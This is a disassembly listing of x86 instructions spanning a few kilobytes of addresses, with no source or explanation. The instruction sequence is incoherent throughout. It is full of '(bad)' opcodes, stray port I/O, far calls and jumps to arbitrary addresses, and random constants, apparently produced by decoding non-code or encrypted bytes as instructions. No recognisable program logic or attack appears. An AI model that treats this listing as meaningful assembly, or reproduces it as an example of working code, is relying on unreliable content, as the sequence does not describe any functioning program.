  41acbe:	mov    ebp,0xdebb78c8
  41acc3:	mov    bl,0x47
  41acc5:	nop
  41acc6:	dec    eax
  41acc7:	and    BYTE PTR [ebx-0x6807c55],dh
  41accd:	mov    ecx,0xf55fd430
  41acd2:	or     cl,al
  41acd4:	push   eax
  41acd5:	pop    esi
  41acd6:	pop    ebp
  41acd7:	add    ebx,eax
  41acd9:	or     eax,0x6175d2e6
  41acde:	dec    esp
  41acdf:	mov    ds:0x80481a4e,eax
  41ace4:	dec    esi
  41ace5:	lea    esp,[edx]
  41ace7:	dec    eax
  41ace8:	call   0x899218a4
  41aced:	fistp  QWORD PTR [eax-0x4d]
  41acf0:	dec    edx
  41acf1:	mov    dh,BYTE PTR [esi-0x79c8cbeb]
  41acf7:	ins    BYTE PTR es:[edi],dx
  41acf8:	outs   dx,DWORD PTR ds:[esi]
  41acf9:	dec    esp
  41acfa:	outs   dx,BYTE PTR ds:[esi]
  41acfb:	cmp    eax,0x5e20b944
  41ad00:	mov    ds:0x1bcc8d65,eax
  41ad05:	lds    ecx,FWORD PTR [ebx-0x1bc95d57]
  41ad0b:	xchg   esp,eax
  41ad0c:	inc    eax
  41ad0d:	out    0xc4,eax
  41ad0f:	into   
  41ad10:	mul    BYTE PTR ds:0xed0adde5
  41ad16:	aad    0xef
  41ad18:	xchg   ebx,eax
  41ad19:	ins    BYTE PTR es:[edi],dx
  41ad1a:	or     BYTE PTR [ecx-0x766ccb6a],0x6c
  41ad21:	adc    dl,BYTE PTR [edi-0xb407a5a]
  41ad27:	je     0x41acbf
  41ad29:	shr    BYTE PTR [ebx+edx*1-0x34d301c],0x28
  41ad31:	call   0x1d7a:0x856e3465
  41ad38:	lock cmc 
  41ad3a:	add    ebp,DWORD PTR [ecx]
  41ad3c:	mov    eax,0x52a4e718
  41ad41:	test   esp,ebx
  41ad43:	cmp    DWORD PTR [edx],ebx
  41ad45:	rcr    DWORD PTR [ebx],cl
  41ad47:	in     eax,dx
  41ad48:	lock sub ah,BYTE PTR [ebx-0x1e]
  41ad4c:	pop    edi
  41ad4d:	or     DWORD PTR [esi],0x7a
  41ad50:	lods   eax,DWORD PTR ds:[esi]
  41ad51:	(bad)  
  41ad52:	std    
  41ad53:	sub    DWORD PTR [edx+0x7eec44d9],ecx
  41ad59:	in     eax,dx
  41ad5a:	popf   
  41ad5b:	pop    ss
  41ad5c:	cmp    BYTE PTR [edi+eiz*1+0x6f],dl
  41ad60:	jmp    0x41ad00
  41ad62:	pop    ds
  41ad63:	in     eax,0x57
  41ad65:	xchg   esi,eax
  41ad66:	aam    0xde
  41ad68:	push   es
  41ad69:	test   BYTE PTR [esi+0x9acc328],bl
  41ad6f:	mov    ch,0xce
  41ad71:	call   DWORD PTR [eax+esi*2-0x774cf862]
  41ad78:	sub    DWORD PTR [ebp+0x53b43dbc],ecx
  41ad7e:	inc    eax
  41ad7f:	push   0x83597bb2
  41ad84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad85:	and    BYTE PTR [edx+edx*2-0x4f6f1389],dh
  41ad8c:	clc    
  41ad8d:	lahf   
  41ad8e:	cmp    eax,0xa3c87594
  41ad93:	je     0x41adb0
  41ad95:	pushf  
  41ad96:	ins    WORD PTR es:[edi],dx
  41ad98:	leave  
  41ad99:	imul   esp,DWORD PTR [esi-0x6d38142a],0x3a
  41ada0:	mov    dh,bh
  41ada2:	sub    dl,BYTE PTR [ebx-0x9ea9190]
  41ada8:	(bad)  
  41ada9:	rcl    ecx,1
  41adab:	and    DWORD PTR [esp+eax*2],ecx
  41adae:	jnp    0x41ae21
  41adb0:	adc    DWORD PTR [edi+0xe],ebx
  41adb3:	outs   dx,DWORD PTR ds:[esi]
  41adb4:	shl    DWORD PTR [ecx-0x50],1
  41adb7:	dec    ecx
  41adb8:	cmp    ah,BYTE PTR [esi-0x7f35e7c4]
  41adbe:	in     al,dx
  41adbf:	stos   BYTE PTR es:[edi],al
  41adc0:	adc    al,0x9e
  41adc2:	pop    edx
  41adc3:	mov    eax,DWORD PTR ds:0xac926543
  41adc9:	xchg   BYTE PTR [eax+0x6b3b7998],al
  41adcf:	lds    ebx,FWORD PTR [edi+0x7d2752f5]
  41add5:	out    dx,eax
  41add6:	push   es
  41add7:	mov    DWORD PTR [edi+ecx*1],edi
  41adda:	pop    edx
  41addb:	ja     0x41ae01
  41addd:	mov    edi,0xb0b0860e
  41ade2:	mov    edx,0xe4ad491d
  41ade7:	jmp    0x5a37946d
  41adec:	xchg   esi,eax
  41aded:	mov    eax,ds:0xc7a0e34
  41adf2:	lea    esi,[edx+0xc9e105]
  41adf8:	jbe    0x41ae74
  41adfa:	mov    cl,0xcb
  41adfc:	or     ch,BYTE PTR [edx+0x5b]
  41adff:	fistp  QWORD PTR [edi-0x68466d70]
  41ae05:	mov    eax,ds:0x23594507
  41ae0a:	and    al,0x8e
  41ae0c:	jmp    0x41adcf
  41ae0e:	pop    ebx
  41ae0f:	push   0x5f
  41ae11:	imul   eax,eax,0x6b
  41ae14:	mov    ds:0x6aa601d0,al
  41ae19:	inc    eax
  41ae1a:	leave  
  41ae1b:	push   0x75c21b3b
  41ae20:	mov    dl,0xc5
  41ae22:	fwait
  41ae23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae24:	mov    fs,WORD PTR [esi+edx*2-0x39]
  41ae28:	pusha  
  41ae29:	gs and cl,cl
  41ae2c:	jns    0x41ae65
  41ae2e:	jmp    0x41adc2
  41ae30:	int3   
  41ae31:	outs   dx,DWORD PTR ds:[esi]
  41ae32:	retf   0x7b38
  41ae35:	retf   
  41ae36:	std    
  41ae37:	mov    esp,0x7332de9f
  41ae3c:	prefetch BYTE PTR [esi+0x65833a62]
  41ae43:	push   ds
  41ae44:	lods   eax,DWORD PTR ds:[esi]
  41ae45:	mov    dl,0x63
  41ae47:	int    0xa0
  41ae49:	pushf  
  41ae4a:	cmp    DWORD PTR [eax+0x48],0x2ac0d79e
  41ae51:	dec    edx
  41ae52:	mov    dl,0xd2
  41ae54:	and    BYTE PTR [edx+0x78],al
  41ae57:	out    0x7f,eax
  41ae59:	daa    
  41ae5a:	fnstenv [edi]
  41ae5c:	lods   al,BYTE PTR ds:[esi]
  41ae5d:	xchg   ebp,eax
  41ae5e:	sbb    bh,dl
  41ae60:	inc    ebx
  41ae61:	retf   0x2881
  41ae64:	dec    DWORD PTR [eax]
  41ae66:	sub    DWORD PTR [esi+0x12],edi
  41ae69:	push   ss
  41ae6a:	das    
  41ae6b:	inc    edx
  41ae6c:	fldcw  WORD PTR [edx-0x75]
  41ae6f:	xor    BYTE PTR [ebx-0x4d230c37],ah
  41ae75:	xchg   ebp,eax
  41ae76:	ror    DWORD PTR [eax+0x6e926c09],cl
  41ae7c:	mov    esi,0x9093ac77
  41ae81:	add    eax,ecx
  41ae83:	mov    ah,0x0
  41ae85:	jae    0x41ae25
  41ae87:	adc    eax,0xd3b91802
  41ae8c:	pop    ss
  41ae8d:	sar    DWORD PTR [esi-0x5099036],cl
  41ae93:	or     DWORD PTR ds:0xe8d44805,eax
  41ae99:	push   ss
  41ae9a:	out    dx,eax
  41ae9b:	pop    eax
  41ae9c:	test   eax,edi
  41ae9e:	pusha  
  41ae9f:	int3   
  41aea0:	leave  
  41aea1:	rcr    BYTE PTR ds:0x30639223,1
  41aea7:	fcmovb st,st(3)
  41aea9:	pop    edi
  41aeaa:	out    dx,al
  41aeab:	pop    esp
  41aeac:	xchg   ebx,eax
  41aead:	pop    edi
  41aeae:	cld    
  41aeaf:	mov    cl,0x58
  41aeb1:	or     BYTE PTR [edx+ecx*4-0x64],cl
  41aeb5:	addr16 add al,0x3b
  41aeb8:	out    0x52,al
  41aeba:	(bad)  
  41aebb:	jg     0x41ae8b
  41aebd:	inc    edi
  41aebe:	jnp    0x41aec5
  41aec0:	add    BYTE PTR [ecx-0x532f20dc],cl
  41aec6:	jmp    0x33c97ad2
  41aecb:	mov    ds:0x159c6cee,al
  41aed0:	sub    al,BYTE PTR [ebp+0x4a41d233]
  41aed6:	test   BYTE PTR [esi-0x317515ef],al
  41aedc:	mov    al,0x9d
  41aede:	xor    ch,BYTE PTR [ebx]
  41aee0:	(bad)  
  41aee1:	aad    0xfe
  41aee3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aee4:	out    dx,eax
  41aee5:	xchg   ebx,eax
  41aee6:	and    eax,DWORD PTR ds:0x7f56770d
  41aeec:	ret    
  41aeed:	sahf   
  41aeee:	nop
  41aeef:	ins    BYTE PTR es:[edi],dx
  41aef0:	mov    eax,0xfd58b75b
  41aef5:	fnstenv [ecx+0x214f40d9]
  41aefb:	jae    0x41af47
  41aefd:	push   esp
  41aefe:	loop   0x41af4d
  41af00:	test   eax,0x83f0fe1e
  41af05:	adc    BYTE PTR [ecx+esi*1],bh
  41af08:	push   ebx
  41af09:	jmp    0x265c913f
  41af0e:	jns    0x41af15
  41af10:	push   ebx
  41af11:	push   cs
  41af12:	pop    ds
  41af13:	mov    ebp,0x1d6e3855
  41af18:	sub    dh,BYTE PTR es:[esi]
  41af1b:	nop
  41af1c:	int3   
  41af1d:	pop    ds
  41af1e:	xor    al,0xc3
  41af20:	lahf   
  41af21:	mov    ah,0x50
  41af23:	test   DWORD PTR [ebp+0x4b],ebp
  41af26:	push   esi
  41af27:	sbb    eax,0xfe53c796
  41af2c:	cmp    eax,0x1510fe41
  41af31:	or     dl,BYTE PTR [edi]
  41af33:	mov    eax,0xdc6f58d
  41af38:	shl    DWORD PTR [edx-0x4f1d5068],1
  41af3e:	mov    ebp,0xb9182217
  41af43:	inc    esi
  41af44:	xor    edi,edx
  41af46:	xor    cl,ch
  41af48:	ja     0x41aee4
  41af4a:	test   eax,0x1a169b25
  41af4f:	dec    edx
  41af50:	add    bh,ah
  41af52:	sar    bl,1
  41af54:	pop    esp
  41af55:	or     eax,0x74e989a
  41af5a:	retf   0x296b
  41af5d:	adc    BYTE PTR [ecx+0x22],al
  41af60:	daa    
  41af61:	scas   eax,DWORD PTR es:[edi]
  41af62:	icebp  
  41af63:	fst    DWORD PTR [edx+0x5e255cb1]
  41af69:	arpl   si,dx
  41af6b:	push   ebx
  41af6c:	(bad)  
  41af6e:	(bad)  
  41af6f:	push   esi
  41af70:	pushf  
  41af71:	ret    
  41af72:	xchg   ebp,eax
  41af73:	pop    esi
  41af74:	cmp    BYTE PTR [ecx+0x39763153],0x54
  41af7b:	ins    BYTE PTR es:[edi],dx
  41af7c:	lahf   
  41af7d:	xor    ecx,DWORD PTR [edx]
  41af7f:	fld    QWORD PTR [ebx-0x57866cdd]
  41af85:	xor    ecx,DWORD PTR [edi+eiz*1+0x47e54336]
  41af8c:	adc    dl,cl
  41af8e:	push   ebp
  41af8f:	mov    esp,edx
  41af91:	dec    edi
  41af92:	cmp    al,0xc6
  41af94:	iret   
  41af95:	jb     0x41afe8
  41af97:	adc    bl,al
  41af99:	outs   dx,DWORD PTR ds:[esi]
  41af9a:	and    ebx,0xf990d39a
  41afa0:	mov    esp,DWORD PTR [ebx+0x4]
  41afa3:	add    eax,0xdea9ea5c
  41afa8:	xor    dl,BYTE PTR [ebx]
  41afaa:	into   
  41afab:	xor    BYTE PTR [edx-0x4b],al
  41afae:	jae    0x41afae
  41afb0:	lods   eax,DWORD PTR ds:[esi]
  41afb1:	lods   eax,DWORD PTR ds:[esi]
  41afb2:	cld    
  41afb3:	cmp    al,0xe6
  41afb5:	xchg   esi,eax
  41afb6:	ret    0x2471
  41afb9:	scas   eax,DWORD PTR es:[edi]
  41afba:	add    esp,0x64
  41afbd:	or     edx,DWORD PTR [eax]
  41afbf:	xor    ch,BYTE PTR [esi]
  41afc1:	inc    edx
  41afc2:	cmp    esp,DWORD PTR [eax+0x6f5fa423]
  41afc8:	cld    
  41afc9:	dec    edx
  41afca:	call   0x3481:0xbc21d2be
  41afd1:	aad    0x8f
  41afd3:	bnd call 0x3319cac7
  41afd9:	pop    ebx
  41afda:	xchg   esi,eax
  41afdb:	jb     0x41afb0
  41afdd:	push   edi
  41afde:	pusha  
  41afdf:	dec    ecx
  41afe0:	addr16 retf 
  41afe2:	repnz pop ds
  41afe4:	fs loope 0x41affa
  41afe7:	and    al,BYTE PTR [esi-0x51]
  41afea:	xchg   edi,eax
  41afeb:	fs fcmovb st,st(0)
  41afee:	xchg   esp,ecx
  41aff0:	mov    WORD PTR [ebx+0x2051106f],gs
  41aff6:	or     BYTE PTR [edx],dl
  41aff8:	push   esi
  41aff9:	out    dx,eax
  41affa:	xchg   esp,eax
  41affb:	pop    ebp
  41affc:	pop    eax
  41affd:	ins    BYTE PTR es:[edi],dx
  41affe:	aas    
  41afff:	push   ecx
  41b000:	test   eax,0xd2e8d7bd
  41b005:	pop    eax
  41b006:	jge    0x41b015
  41b008:	mov    ebp,0xb3527550
  41b00d:	popf   
  41b00e:	jle    0x41afbf
  41b010:	retf   
  41b011:	or     al,BYTE PTR [edi]
  41b013:	ret    0x9ef9
  41b016:	cmp    eax,0x6ac6bc87
  41b01b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b01c:	cli    
  41b01d:	popf   
  41b01e:	lock fs jecxz 0x41afb9
  41b022:	fidivr DWORD PTR [esi-0x2d]
  41b025:	or     edi,DWORD PTR [edx]
  41b027:	mov    esp,0xc761e748
  41b02c:	jle    0x41b03f
  41b02e:	fisttp DWORD PTR [ecx+0x66]
  41b031:	shl    BYTE PTR [eax+ecx*8-0x59],0xa7
  41b036:	or     BYTE PTR [esi+0x2243fb9d],0x28
  41b03d:	(bad)  
  41b03e:	aad    0x9d
  41b040:	xchg   ebx,eax
  41b041:	lds    ebx,FWORD PTR ds:0xb4ee213f
  41b047:	(bad)  
  41b048:	mov    cl,0x1c
  41b04a:	(bad)  
  41b04b:	xchg   esp,eax
  41b04c:	dec    DWORD PTR [esi+eax*4-0x45]
  41b050:	xor    DWORD PTR [edx-0x3dec8f23],ecx
  41b056:	jb     0x41b080
  41b058:	shl    dl,cl
  41b05a:	retf   0xa718
  41b05d:	push   cs
  41b05e:	jp     0x41b0ad
  41b060:	pop    ebx
  41b061:	out    0xf7,eax
  41b063:	jnp    0x41aff9
  41b065:	mov    ds,WORD PTR [esi-0x6]
  41b068:	push   esp
  41b069:	push   0xaa8bfd7c
  41b06e:	xchg   edi,eax
  41b06f:	ret    0xa62b
  41b072:	inc    edi
  41b073:	mov    bl,0x9
  41b075:	retf   0x92da
  41b078:	inc    edx
  41b079:	jecxz  0x41b02b
  41b07b:	not    DWORD PTR [edx]
  41b07d:	iret   
  41b07e:	ret    
  41b07f:	int    0x21
  41b081:	or     ebp,edi
  41b083:	mov    ss,WORD PTR [esi-0x7ad22af1]
  41b089:	jecxz  0x41b024
  41b08b:	ins    BYTE PTR es:[edi],dx
  41b08c:	xchg   edi,eax
  41b08d:	addr16 sub ch,ah
  41b090:	pop    esp
  41b091:	(bad)  
  41b092:	xchg   esp,eax
  41b093:	loope  0x41b068
  41b095:	push   ebp
  41b096:	add    eax,0x456a882b
  41b09b:	lahf   
  41b09c:	call   0x4763:0x8d99e67f
  41b0a3:	ds cmp al,0xa0
  41b0a6:	aam    0x9
  41b0a8:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0aa:	and    al,0xd5
  41b0ac:	sahf   
  41b0ad:	push   es
  41b0ae:	xor    ah,ch
  41b0b0:	pop    edx
  41b0b1:	xor    eax,0xc552c3df
  41b0b6:	je     0x41b0f9
  41b0b8:	xchg   ebp,eax
  41b0b9:	mov    al,0xcb
  41b0bb:	xchg   edi,eax
  41b0bc:	arpl   WORD PTR [eax+0x36],si
  41b0bf:	loopne 0x41b13c
  41b0c1:	mov    edi,0xe923d3e6
  41b0c6:	add    dl,BYTE PTR [edx]
  41b0c8:	clc    
  41b0c9:	adc    ebp,DWORD PTR [edi+ebp*8-0x5c1289b1]
  41b0d0:	and    eax,0x95572f7f
  41b0d5:	jne    0x41b12f
  41b0d7:	stos   DWORD PTR es:[edi],eax
  41b0d8:	icebp  
  41b0d9:	(bad)  
  41b0da:	shr    BYTE PTR [esi+0x68fec5d6],cl
  41b0e0:	mov    esi,DWORD PTR [eax]
  41b0e2:	jp     0x41b08c
  41b0e4:	inc    esi
  41b0e5:	out    dx,eax
  41b0e6:	shr    DWORD PTR [eax-0x61],1
  41b0e9:	or     BYTE PTR [ebx],dh
  41b0eb:	lds    esp,FWORD PTR [esp+edi*4-0x38]
  41b0ef:	mov    ds:0x1e41a915,al
  41b0f4:	push   ss
  41b0f5:	arpl   bx,bx
  41b0f7:	fs jo  0x41b0b7
  41b0fa:	(bad)  
  41b0fb:	mov    edx,DWORD PTR [ebx+eiz*4]
  41b0fe:	jb     0x41b097
  41b100:	ins    DWORD PTR es:[edi],dx
  41b101:	cmp    bh,BYTE PTR [ecx]
  41b103:	mov    bh,0x1e
  41b105:	adc    eax,0x1b451498
  41b10a:	fisub  DWORD PTR [eax]
  41b10c:	loop   0x41b14d
  41b10e:	(bad)  
  41b10f:	test   DWORD PTR [ecx+0x6a],edi
  41b112:	fidiv  DWORD PTR [ebx-0xd]
  41b115:	or     BYTE PTR [ecx],ch
  41b117:	cli    
  41b118:	out    0x8f,eax
  41b11a:	cmp    BYTE PTR [ecx-0x6],ch
  41b11d:	mov    ds:0x673c0f7,eax
  41b122:	dec    ebp
  41b123:	push   cs
  41b124:	push   0x84ee419e
  41b129:	repz mov es,WORD PTR [eax+esi*8-0xe659a8f]
  41b131:	pop    ds
  41b132:	aam    0x6b
  41b134:	and    DWORD PTR [edi-0x1e812e98],edi
  41b13a:	pop    ds
  41b13b:	ja     0x41b1ba
  41b13d:	push   ebx
  41b13e:	in     eax,0x2b
  41b140:	stos   DWORD PTR es:[edi],eax
  41b141:	stc    
  41b142:	loope  0x41b191
  41b144:	sub    eax,0x5500c831
  41b149:	dec    edx
  41b14a:	ffree  st(7)
  41b14c:	aaa    
  41b14d:	xor    eax,0x3312121d
  41b152:	mov    esi,0x391ae069
  41b157:	jp     0x41b1a7
  41b159:	jmp    0x40bc:0x567bd107
  41b160:	push   0x4
  41b162:	repnz lds edx,FWORD PTR [esi]
  41b165:	sub    DWORD PTR [edi-0x5e],ebx
  41b168:	fnsave [ecx]
  41b16a:	sbb    BYTE PTR [esi+0x416922b5],cl
  41b170:	es xchg ecx,eax
  41b172:	cmp    esi,DWORD PTR [ecx-0x7e016b0c]
  41b178:	inc    eax
  41b179:	jo     0x41b1e0
  41b17b:	test   ch,dl
  41b17d:	pop    ebx
  41b17e:	or     eax,0x44013e9f
  41b183:	(bad)  
  41b185:	or     al,bh
  41b187:	sbb    eax,0x83e497a8
  41b18c:	out    dx,al
  41b18d:	enter  0xbc29,0xc3
  41b191:	mov    al,ds:0xeb5dd457
  41b196:	jp     0x41b1b6
  41b198:	and    BYTE PTR [edx+edx*2],al
  41b19b:	scas   eax,DWORD PTR es:[edi]
  41b19c:	shr    esi,0x2f
  41b19f:	adc    ebx,DWORD PTR [esi]
  41b1a1:	div    BYTE PTR [edi+0x53]
  41b1a4:	fild   WORD PTR [edi+0x2c]
  41b1a7:	int    0x5c
  41b1a9:	or     DWORD PTR [eax+0x578f32b3],ebx
  41b1af:	fs call 0x791f:0x4aa5ac08
  41b1b7:	mov    ebp,0xfe8abb16
  41b1bc:	adc    ah,ch
  41b1be:	mov    dh,0xf0
  41b1c0:	icebp  
  41b1c1:	xchg   esp,eax
  41b1c2:	es mov ch,0xd7
  41b1c5:	mov    dl,0x13
  41b1c7:	mov    esi,ebp
  41b1c9:	adc    eax,0xcd5b2316
  41b1ce:	leave  
  41b1cf:	mov    eax,ds:0x6f5f8450
  41b1d4:	(bad)  
  41b1d5:	dec    esi
  41b1d6:	test   BYTE PTR [esi+eiz*1],dl
  41b1d9:	inc    edi
  41b1da:	aaa    
  41b1db:	outs   dx,BYTE PTR ds:[esi]
  41b1dc:	jno    0x41b1e3
  41b1de:	xchg   DWORD PTR [eax],edx
  41b1e0:	out    0x66,al
  41b1e2:	xchg   edi,esp
  41b1e4:	mov    BYTE PTR [esi],ch
  41b1e6:	inc    esi
  41b1e7:	mov    ebp,0xd7623190
  41b1ec:	inc    edx
  41b1ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b1ee:	stc    
  41b1ef:	xchg   DWORD PTR [eax+0x44d901a9],esi
  41b1f5:	idiv   BYTE PTR [ebp+eax*8-0x470a4e7c]
  41b1fc:	lahf   
  41b1fd:	xchg   ebp,eax
  41b1fe:	cmp    eax,0x3dc20d52
  41b203:	rcl    WORD PTR [eax+0x78],cl
  41b207:	mov    BYTE PTR [eax+0x50757506],bl
  41b20d:	mov    dh,0xe2
  41b20f:	cmp    ecx,DWORD PTR [esi+0x6e]
  41b212:	mov    bh,BYTE PTR [eax-0x8]
  41b215:	in     eax,dx
  41b216:	mov    ds:0xd46e127a,al
  41b21b:	lds    edi,FWORD PTR [ecx-0x15409d28]
  41b221:	cs (bad) 
  41b223:	ffree  st(3)
  41b225:	mov    edx,0xc94ffa18
  41b22a:	fidiv  WORD PTR [di]
  41b22d:	fbld   TBYTE PTR ds:0x23487c36
  41b233:	fwait
  41b234:	clc    
  41b235:	outs   dx,DWORD PTR ds:[esi]
  41b236:	mov    DWORD PTR [edi-0x3b],edx
  41b239:	add    edi,DWORD PTR [eax]
  41b23b:	or     BYTE PTR [esi],ch
  41b23d:	neg    BYTE PTR [esi-0x8]
  41b240:	xchg   edi,eax
  41b241:	ds (bad) 
  41b243:	ss leave 
  41b245:	dec    esp
  41b246:	pop    esi
  41b247:	or     DWORD PTR [ebp+0x740f2d1b],0xfffffff0
  41b24e:	and    BYTE PTR [edi-0x1e06d7f1],dh
  41b254:	lea    edx,[edi-0x50e983db]
  41b25a:	pop    esp
  41b25b:	imul   BYTE PTR [ebp+0x7b]
  41b25e:	aas    
  41b25f:	xchg   edi,eax
  41b260:	adc    ebx,ecx
  41b262:	mov    eax,ds:0xa46fefe6
  41b267:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b268:	push   ebx
  41b269:	mov    al,ds:0x52dbe444
  41b26e:	push   ss
  41b26f:	mov    ebp,0xcca90b4c
  41b274:	gs stos DWORD PTR es:[edi],eax
  41b276:	add    eax,0x1c66642c
  41b27b:	mov    cl,0xbb
  41b27d:	inc    ecx
  41b27e:	push   0xffffffac
  41b280:	out    0xe0,al
  41b282:	cmp    bl,BYTE PTR ds:0x74e9fac6
  41b288:	lods   ax,WORD PTR ds:[esi]
  41b28a:	cmp    al,0xfc
  41b28c:	jge    0x41b23b
  41b28e:	es out dx,eax
  41b290:	pop    ds
  41b291:	mov    cs,ebx
  41b293:	lea    edx,[ebp+0x40]
  41b296:	dec    ecx
  41b297:	sbb    bl,BYTE PTR [ecx+0x1ba626e]
  41b29d:	aaa    
  41b29e:	psubw  mm0,QWORD PTR [ebp-0x17]
  41b2a2:	es scas al,BYTE PTR es:[edi]
  41b2a4:	pop    ds
  41b2a5:	test   BYTE PTR [ecx+edi*8-0x3f],al
  41b2a9:	jmp    0x49086f2c
  41b2ae:	xor    ebp,ecx
  41b2b0:	push   ss
  41b2b1:	push   ecx
  41b2b2:	mov    bl,0xaf
  41b2b4:	xor    DWORD PTR [edx],0xb
  41b2b7:	iret   
  41b2b8:	adc    eax,ecx
  41b2ba:	cmp    eax,0xf77d677a
  41b2bf:	pushf  
  41b2c0:	in     eax,0xc9
  41b2c2:	xor    al,0xd5
  41b2c4:	and    eax,DWORD PTR [ecx]
  41b2c6:	jae    0x41b29a
  41b2c8:	aas    
  41b2c9:	sar    BYTE PTR [edi+ebp*1+0x78],cl
  41b2cd:	mov    bl,0x32
  41b2cf:	shl    DWORD PTR [eax-0x39b1879d],0x99
  41b2d6:	push   eax
  41b2d7:	nop
  41b2d8:	outs   dx,BYTE PTR ds:[esi]
  41b2d9:	pop    ss
  41b2da:	fwait
  41b2db:	out    dx,eax
  41b2dc:	pop    es
  41b2dd:	(bad)  
  41b2df:	inc    esp
  41b2e0:	rol    DWORD PTR [eax+0x34f87c6],cl
  41b2e6:	into   
  41b2e7:	pop    ebx
  41b2e8:	aam    0x6
  41b2ea:	cmp    BYTE PTR [ebx-0x72e539c0],ah
  41b2f0:	jno    0x41b35c
  41b2f2:	or     eax,0x8ea8f530
  41b2f7:	mov    eax,ds:0x9553bb69
  41b2fc:	ficom  DWORD PTR [esi-0x37a07f5a]
  41b302:	adc    al,0x96
  41b304:	das    
  41b305:	out    0x34,al
  41b307:	mov    dh,0xe2
  41b309:	mov    DWORD PTR [esi+0x311831e8],esi
  41b30f:	cmp    DWORD PTR [ecx+0x26],ecx
  41b312:	xlat   BYTE PTR ds:[ebx]
  41b313:	push   0x7c
  41b315:	xchg   edi,eax
  41b316:	scas   eax,DWORD PTR es:[edi]
  41b317:	fmul   DWORD PTR [ecx]
  41b319:	stos   BYTE PTR es:[edi],al
  41b31a:	jb     0x41b2e8
  41b31c:	aad    0xd7
  41b31e:	xchg   DWORD PTR [esi-0x67],edi
  41b321:	sti    
  41b322:	sbb    DWORD PTR [ecx+0x1e18dd5c],ebp
  41b328:	and    al,0x5
  41b32a:	neg    BYTE PTR [eax+0x44be3f7e]
  41b330:	pop    es
  41b331:	sub    al,BYTE PTR [esi+eax*1]
  41b334:	xor    BYTE PTR [ecx+0x21],ch
  41b337:	mov    al,ds:0x444c0178
  41b33c:	data16 or BYTE PTR [ecx],al
  41b33f:	scas   eax,DWORD PTR es:[edi]
  41b340:	mov    eax,0xedb6f4a1
  41b345:	adc    eax,0xf8166093
  41b34a:	sub    al,0x9c
  41b34c:	shl    BYTE PTR ds:0xef94dfc,cl
  41b352:	inc    ecx
  41b353:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b354:	gs lock lahf 
  41b357:	mov    al,0xb2
  41b359:	inc    ecx
  41b35a:	(bad)  
  41b35b:	cmp    al,BYTE PTR [edx-0x1b]
  41b35e:	(bad)  
  41b35f:	pop    ss
  41b360:	push   0x51
  41b362:	aaa    
  41b363:	ds jns 0x41b353
  41b366:	cmp    edi,edi
  41b368:	test   BYTE PTR [edx],0x9
  41b36b:	test   al,0xae
  41b36d:	or     BYTE PTR [edx],al
  41b36f:	icebp  
  41b370:	retf   
  41b371:	cld    
  41b372:	in     al,0xa6
  41b374:	in     eax,dx
  41b375:	push   ss
  41b376:	jecxz  0x41b335
  41b378:	mov    ebp,0x483d0c66
  41b37d:	repz leave 
  41b37f:	sbb    al,0x4b
  41b381:	xor    DWORD PTR [edi],ecx
  41b383:	loop   0x41b34c
  41b385:	retf   0x3113
  41b388:	add    edx,DWORD PTR [esi-0x66]
  41b38b:	dec    esp
  41b38c:	lods   al,BYTE PTR ds:[esi]
  41b38d:	xor    esi,ebp
  41b38f:	loope  0x41b38b
  41b391:	sar    DWORD PTR [edx],1
  41b393:	adc    esi,DWORD PTR [edx+0x194abb9]
  41b399:	cwde   
  41b39a:	xor    al,0x4c
  41b39c:	stos   DWORD PTR es:[edi],eax
  41b39d:	daa    
  41b39e:	pop    cx
  41b3a0:	sti    
  41b3a1:	push   esi
  41b3a2:	fsub   st(2),st
  41b3a4:	aas    
  41b3a5:	jae    0x41b3cf
  41b3a7:	in     al,0xb5
  41b3a9:	sub    BYTE PTR [ebx-0x30aa91f5],0x60
  41b3b0:	xchg   ecx,eax
  41b3b1:	call   0x89d4:0x35acfa34
  41b3b8:	push   0xa01e27e
  41b3bd:	xchg   BYTE PTR [edx-0x2c],ah
  41b3c0:	dec    ebx
  41b3c1:	call   0x85a83961
  41b3c6:	xchg   ebp,eax
  41b3c7:	lods   eax,DWORD PTR ds:[esi]
  41b3c8:	jno    0x41b407
  41b3ca:	mov    ecx,0x6d7ad6b2
  41b3cf:	pop    ss
  41b3d0:	mov    al,0x6b
  41b3d2:	popa   
  41b3d3:	test   cx,si
  41b3d6:	bound  eax,QWORD PTR [edi]
  41b3d8:	add    al,0xe
  41b3da:	fstp   TBYTE PTR [esp+ebx*8]
  41b3dd:	js     0x41b388
  41b3df:	dec    esp
  41b3e0:	test   al,bl
  41b3e2:	xor    eax,0x461a13e3
  41b3e7:	sub    ebx,DWORD PTR [ebp+0x3279a1a3]
  41b3ed:	jb     0x41b453
  41b3ef:	sbb    eax,0xdb30ec0f
  41b3f4:	mov    DWORD PTR [ebx],ecx
  41b3f6:	stc    
  41b3f7:	pop    ebx
  41b3f8:	jle    0x41b41e
  41b3fa:	inc    ebp
  41b3fb:	int    0x6a
  41b3fd:	shl    BYTE PTR [edx+0x330db441],0x11
  41b404:	push   edi
  41b405:	andnps xmm7,XMMWORD PTR [eax]
  41b408:	dec    ebp
  41b409:	or     bh,BYTE PTR [edx-0x6fff221d]
  41b40f:	or     BYTE PTR ds:0x2c04dd36,ah
  41b415:	dec    edi
  41b416:	jle    0x41b411
  41b418:	inc    ecx
  41b419:	xchg   BYTE PTR [edi],ch
  41b41b:	cwde   
  41b41c:	fucomip st,st(6)
  41b41e:	icebp  
  41b41f:	ss mov edx,0x3bc7e2f0
  41b425:	or     al,0x6
  41b427:	xchg   ebx,eax
  41b428:	and    al,0xbf
  41b42a:	add    dh,BYTE PTR [eax]
  41b42c:	jns    0x41b420
  41b42e:	push   eax
  41b42f:	pop    ecx
  41b430:	jmp    0xf24e:0x8f1b8f8b
  41b437:	mov    bh,0x32
  41b439:	push   ss
  41b43a:	into   
  41b43b:	mov    ch,0x2c
  41b43d:	rcr    BYTE PTR gs:0x7cc853d3,cl
  41b444:	in     al,dx
  41b445:	das    
  41b446:	and    DWORD PTR [ecx],ebp
  41b448:	ret    0x32c4
  41b44b:	or     eax,0x37cdf32d
  41b450:	data16 add bl,BYTE PTR [edx]
  41b453:	push   esi
